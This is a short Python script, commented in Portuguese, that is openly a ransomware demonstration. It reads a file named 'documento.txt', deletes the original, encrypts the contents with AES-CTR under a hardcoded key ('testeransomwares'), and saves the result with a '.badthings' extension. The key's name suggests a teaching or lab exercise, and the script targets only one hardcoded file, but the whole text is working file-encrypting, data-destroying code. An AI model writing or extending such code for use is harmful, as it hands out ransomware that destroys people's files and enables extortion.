import os #sistemas operacionais
import pyaes #biblioteca de criptografia

#abre o arquivo a ser criptografado 
file_name = "documento.txt"
file = open(file_name, "rb") 
file_data = file.read()
file.close()

#remove o arquivo original 
os.remove(file_name)

#chave de criptografia 
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criptografa o arquivo
crypto_data = aes.encrypt(file_data)

#salva arquivo criptografado 
new_file = file_name + ".badthings"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
